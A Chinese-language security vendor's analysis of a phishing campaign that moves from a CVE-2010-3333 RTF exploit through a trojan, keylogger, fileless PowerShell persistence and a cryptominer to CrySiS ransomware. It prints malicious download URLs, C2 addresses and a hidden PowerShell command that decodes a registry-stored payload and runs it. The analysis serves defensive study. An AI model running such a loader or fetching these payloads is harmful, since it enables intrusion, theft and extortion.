**深信服EDR安全团队，整理分析了一起某电商钓鱼事件，通过关联信息，发现背后可能存在一个“产业链齐全”的黑客团伙，研究发现其具备“一站式服务”的黑客攻击手段。**

黑客攻击手段包括但不限于钓鱼邮件、漏洞利用、挖矿病毒、勒索病毒、无文件攻击、远控木马、键盘记录器、密码破解等，是一次完整而全套的“服务”。

![图片1.png](https://image.3001.net/images/20181119/1542598612_5bf22fd4b565c.png!small)

最开始，可能仅仅是一封精心构造的邮件触发的，经过信息收集和远程控制，在闲时挖矿榨干主机性能，当窃取到足够机密，又最后“卸磨杀驴”“杀鸡取卵”，执行勒索操作。

![图片2.png](https://image.3001.net/images/20181119/1542598622_5bf22fde532f9.png!small)

##  **0x01 定向撒网捞鱼：钓鱼邮件**

XX公司已经被黑客盯上了，黑客通过社工拿到该公司的各种邮件账号，并给这些账号发送了钓鱼邮件。

员工A收到一份邮件，这是一份包含了doc附件（实际上是一份富文本文件）的邮件，doc名称为TransferCopy.doc。

以下是邮件的基本信息：

![图片.png](https://image.3001.net/images/20181119/1542598644_5bf22ff4a6bad.png!small)

看上去是一份无害的文件，点开查看该doc，也未发现异常（但此时已经开始后台偷偷执行）。

##  **0x02 苍蝇不叮无缝的蛋：漏洞利用**

苍蝇不叮无缝的蛋，一个普通的doc文档不能触发什么，但是，那是一个特殊构造的文档，里面肯定利用了什么漏洞的。

我们将邮件样本中的Base64加密的附件b64EnTransferCopy.doc提取出来，检测Base64解码的b64DeTransferCopy.doc，发现了b64DeTransferCopy.doc文档中的特殊文本。

![图片.png](https://image.3001.net/images/20181119/1542598655_5bf22fff4561c.png!small)![图片.png](https://image.3001.net/images/20181119/1542598659_5bf23003a8a12.png!small)

可以判断其利用了CVE-2010-3333，漏洞溢出后，执行了下载动作。

![图片.png](https://image.3001.net/images/20181119/1542598666_5bf2300a38199.png!small)

在doc中发现恶意下载链接：

![图片.png](https://image.3001.net/images/20181119/1542598676_5bf230142ad7d.png!small)![图片.png](https://image.3001.net/images/20181119/1542598681_5bf230194d783.png!small)

"<http://polariton.rghost.ru/download/74zJT5wtf/b878e693051a8e541381b1d6378f4ddf62b>
d96b3/b878e693051a8e541381b1d6378f4ddf62bd96b3/b878e693051a8e541381b1d6378f
4ddf62bd96b3/DFGHDFGHJ4567856.exe"

访问这个网址之后，会跳转到<http://rgho.st/74zJT5wtf?r=1088>

![图片.png](https://image.3001.net/images/20181119/1542598689_5bf230216ba79.png!small)

##  **0x03 侦查兵先行：下载木马**

渗透企业内网，免不了先侦查内部主机信息的，黑客最开始，选择了下载并执行木马，完成初步的信息收集和远程控制。

我们将这个样本下载下来，检测为.NET程序，程序没有加壳，但是经过了混淆。

![图片.png](https://image.3001.net/images/20181119/1542598698_5bf2302a6e195.png!small)

通过De4dot反混淆得到如下信息，但是程序还是存在一定的混淆，采用动态分析。

![图片.png](https://image.3001.net/images/20181119/1542598705_5bf2303146d06.png!small)动态分析程序DFGHDFGHJ4567856.exe行为，发现其执行cmd命令
cmd.exe /c systeminfo 获取系统基本信息，写入Info.txt。

![图片.png](https://image.3001.net/images/20181119/1542598718_5bf2303e18c1b.png!small)![图片.png](https://image.3001.net/images/20181119/1542598721_5bf23041d44b6.png!small)

释放AutoUpdate.exe并通过设置注册表，设置其为自启动，进行键鼠记录，将所有的动作记录在logs_xx.xx.xxxx(日期格式).htm文件。

![图片.png](https://image.3001.net/images/20181119/1542598730_5bf2304a71f8c.png!small)![图片.png](https://image.3001.net/images/20181119/1542598734_5bf2304e31308.png!small)

释放键鼠记录器pass.exe并启动，进行密码搜集或者密码破解。

![图片.png](https://image.3001.net/images/20181119/1542598745_5bf230594b565.png!small)

该程序在完成所有释放和启动工作后，会使用HTTP协议连接恶意C2进行交互（回传信息）。

![图片.png](https://image.3001.net/images/20181119/1542598753_5bf23061571fc.png!small)![图片.png](https://image.3001.net/images/20181119/1542598757_5bf23065615d8.png!small)

##  **0x04 对抗升级：无文件攻击**

为了进一步对抗安全产品，黑客并未停手，采取了更为高级、更为隐蔽的攻击手段。

我们发现，其通过自启动注册表项，启动PowerShell执行相应的命令

    
    
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -c "$val = (gp HKLM:SOFTWARE\'??').'??'; $d = [System.Text.Encoding]::Unicode.GetString([System.convert]::FromBase64String($val)); iex $d"

分析上面的命令，它会读取HKLM:SOFTWARE\'??'注册表项的内容，然后通过Base64解码之后执行，另一个注册表项的内容是一串Base64的字符串。

![图片.png](https://image.3001.net/images/20181119/1542598767_5bf2306fd49ff.png!small)

多次解码之后，得到相应的PowerShell源代码。

![图片.png](https://image.3001.net/images/20181119/1542598775_5bf23077bd035.png!small)通过PowerShell脚本，创建一个线程，注入一段ShellCode到远程进程中，执行ShellCode，解密出相应的ShellCode代码。

![图片.png](https://image.3001.net/images/20181119/1542598783_5bf2307feb80e.png!small)

通过InternetOpenA/InternetConnectA/HttpOpenRequestA/HttpSendRequestA等函数，连接或发送网络请求到相应的黑客服务器地址138.197.2.46

![图片.png](https://image.3001.net/images/20181119/1542598792_5bf2308840039.png!small)

分配相应的内存空间，从黑客服务器上读取相关的恶意程序到内存。

![图片.png](https://image.3001.net/images/20181119/1542598800_5bf230904e3f2.png!small)

从黑客服务器上获取到的文件：

![图片.png](https://image.3001.net/images/20181119/1542598809_5bf23099a63a6.png!small)

ShellCode通过反射型DLL注入到进程执行：

![图片.png](https://image.3001.net/images/20181119/1542598817_5bf230a12654e.png!small)

分析从内存中Dump出来的文件，是一个后门程序。

后门程序，释放相应的远控恶意程序文件Folder.exe：

![图片.png](https://image.3001.net/images/20181119/1542598827_5bf230ab3b3b9.png!small)

Folder.exe拷贝自身到C:\Users\panda\AppData\Roaming目录下：

![图片.png](https://image.3001.net/images/20181119/1542598835_5bf230b38bc1a.png!small)

并设置一个隐藏目录的文件夹，将文件拷贝到隐藏目录文件夹下：

![图片.png](https://image.3001.net/images/20181119/1542598844_5bf230bc1b5a1.png!small)

并设置注册表自启动项：

![图片.png](https://image.3001.net/images/20181119/1542598851_5bf230c3b29b1.png!small)

将之前释放到隐藏目录下的副本远控创建为计划任务启动项：

![图片.png](https://image.3001.net/images/20181119/1542598859_5bf230cbe6ffe.png!small)

黑客可以实时监控这台主机，动态分析显示其与远程C2服务器14.215.177.39地址进行通信。

![图片.png](https://image.3001.net/images/20181119/1542598868_5bf230d48c1b6.png!small)

##  **0x05 持续褥羊毛：挖矿**

黑客在攻破该主机之后，就为该主机种上挖矿病毒，持续榨干其性能。

![图片.png](https://image.3001.net/images/20181119/1542598878_5bf230de166f2.png!small)

##  **0x06 猪养肥了就杀掉：执行勒索**

在某天，黑客觉得信息偷得差不多了，挖矿也挖了一段时间，想最后干票大的。其通过远程进来之后，从网站上下载了一个勒索病毒。

![图片.png](https://image.3001.net/images/20181119/1542598888_5bf230e806d7e.png!small)

下载的网站如下：

<http://polariton.rghost.ru/download/74QVXtyvn/5a32f4e1983822ed5d4fcedf2b8d4c276dd77263/5a32f4e1983822ed5d4fcedf2b8d4c276dd77263/Release.zip>

运行下载后的程序，会加密主机上的文件，如下所示：

![图片.png](https://image.3001.net/images/20181119/1542598897_5bf230f170aac.png!small)

并弹出勒索信息界面，研究发现这是一个CrySiS勒索病毒。

![图片.png](https://image.3001.net/images/20181119/1542598904_5bf230f86fd14.png!small)

至此，全套“服务”完成，员工可以下班了。

 ***本文作者：千里目安全实验室，转载请注明来自FreeBuf.COM**

